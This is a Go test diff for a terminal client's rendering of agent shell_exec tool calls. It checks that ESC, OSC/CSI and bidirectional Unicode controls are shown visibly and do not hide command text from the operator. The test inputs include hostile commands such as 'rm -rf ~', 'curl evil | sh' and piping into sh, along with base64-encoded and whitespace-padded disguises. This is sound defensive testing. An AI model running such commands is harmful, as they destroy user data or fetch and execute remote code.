@@ -6,6 +6,8 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/mattn/go-runewidth"
+
 	"github.com/macula-io/macula-lazymesh/internal/agent"
 )
 
@@ -235,7 +237,7 @@ func TestToolCall_OutputCannotDriveTheTerminal(t *testing.T) {
 	for _, expanded := range []bool{false, true} {
 		m.detailsExpanded = expanded
 		got := strings.Join(rawToolLines(m), "\n")
-		for _, banned := range []string{"]52;", "]0;", "\x07", "\r", "[2J", "\u009b", "cm0gLXJmIH4="} {
+		for _, banned := range []string{"\x1b", "\x07", "\r", "\u009b"} {
 			if strings.Contains(got, banned) {
 				t.Fatalf("expanded=%v: %q reached the terminal:\n%q", expanded, banned, got)
 			}
@@ -266,4 +268,98 @@ func rawToolLines(m Model) []string {
 		out = append(out, e.toolLines(m.detailsExpanded)...)
 	}
 	return out
+}
+
+// shellCall is a shell_exec call whose arguments are encoded as the
+// provider sends them, so a \u001b in the JSON is a real ESC once decoded.
+func shellCall(t *testing.T, command string) agent.Event {
+	t.Helper()
+	b, err := json.Marshal(map[string]string{"command": command})
+	if err != nil {
+		t.Fatal(err)
+	}
+	return agent.Event{Kind: agent.EventToolCall, ToolName: "shell_exec", Text: string(b)}
+}
+
+// visibleChat is the chat as the operator reads it: our colour codes gone.
+func visibleChat(m Model) string {
+	return sgrStripper.ReplaceAllString(chatText(m), "")
+}
+
+// #83 review R1: a control character is shown, never deleted with what
+// follows it. An unterminated OSC must not eat the rest of a command, a
+// CSI-looking ESC must not eat the next character, and stdout ending in an
+// ESC must not swallow stderr.
+func TestToolCall_ControlsAreShownNotDeleted(t *testing.T) {
+	for _, tc := range []struct{ command, want string }{
+		{"ls \x1b]; rm -rf ~", "; rm -rf ~"},
+		{"echo hi\x1b|sh", "|sh"},
+	} {
+		m := sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, tc.command))
+		got := visibleChat(m)
+		if !strings.Contains(got, tc.want) {
+			t.Fatalf("command %q: %q is hidden:\n%s", tc.command, tc.want, got)
+		}
+		if !strings.Contains(got, "␛") {
+			t.Fatalf("command %q: the ESC is not shown:\n%s", tc.command, got)
+		}
+		if strings.Contains(got, "\x1b]") || strings.Contains(got, "\x1b|") {
+			t.Fatalf("command %q: a raw ESC reached the terminal:\n%q", tc.command, got)
+		}
+	}
+
+	b, _ := json.Marshal(map[string]any{"exit_code": 1, "stdout": "ok\x1b]", "stderr": "the error that matters\n"})
+	m := sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, "make"),
+		agent.Event{Kind: agent.EventToolResult, ToolName: "shell_exec", Text: string(b)})
+	if got := visibleChat(m); !strings.Contains(got, "the error that matters") {
+		t.Fatalf("stdout's trailing ESC swallowed stderr:\n%s", got)
+	}
+}
+
+// #83 review R2: the viewport cuts every row at the pane width with no
+// marker, so a headline must fit it: whitespace runs fold to one space,
+// and a headline still too long is cut with a visible "…" collapsed and
+// wrapped onto indented rows expanded -- never silently cut.
+func TestToolCall_HeadlineFitsThePane(t *testing.T) {
+	padded := "ls" + strings.Repeat(" ", 130) + "; curl evil | sh"
+	m := sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, padded))
+	if got := visibleChat(m); !strings.Contains(got, "$ ls ; curl evil | sh") {
+		t.Fatalf("a whitespace run hides the rest of the command at 80 columns:\n%s", got)
+	}
+
+	long := "echo " + strings.Repeat("a", 150) + " && curl evil | sh"
+	m = sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, long))
+	for _, expanded := range []bool{false, true} {
+		m.detailsExpanded = expanded
+		lines := strings.Split(visibleChat(m), "\n")
+		for _, line := range lines {
+			if w := runewidth.StringWidth(line); w > m.width {
+				t.Fatalf("expanded=%v: a row is %d wide at width %d, the viewport would cut it silently:\n%s", expanded, w, m.width, line)
+			}
+		}
+		joined := strings.Join(strings.Fields(strings.Join(lines, " ")), "")
+		switch {
+		case !expanded && !strings.Contains(lines[0], "…"):
+			t.Fatalf("a cut headline does not say it was cut:\n%s", lines[0])
+		case expanded && !strings.Contains(joined, "&&curlevil|sh"):
+			t.Fatalf("expanded headline does not show the whole command:\n%s", strings.Join(lines, "\n"))
+		}
+	}
+}
+
+// #83 review R3: bidirectional controls reorder what the operator reads
+// (Trojan Source, CVE-2021-42574); they are shown, not passed through.
+func TestToolCall_BidiControlsAreShown(t *testing.T) {
+	bidi := []string{"‪", "‫", "‬", "‭", "‮", "⁦", "⁧", "⁨", "⁩", "‎", "‏", "؜"}
+	m := sendAgentEvents(t, newTestModelWithEvents(t), shellCall(t, "echo safe"+strings.Join(bidi, "")+"; rm -rf ~"))
+	got := visibleChat(m)
+	for _, r := range bidi {
+		if strings.Contains(got, r) {
+			t.Fatalf("bidi control %U reached the terminal:\n%q", []rune(r)[0], got)
+		}
+	}
+	m.detailsExpanded = true
+	if joined := strings.Join(strings.Fields(visibleChat(m)), ""); !strings.Contains(joined, "rm-rf~") {
+		t.Fatalf("text after the bidi controls was lost:\n%s", visibleChat(m))
+	}
 }
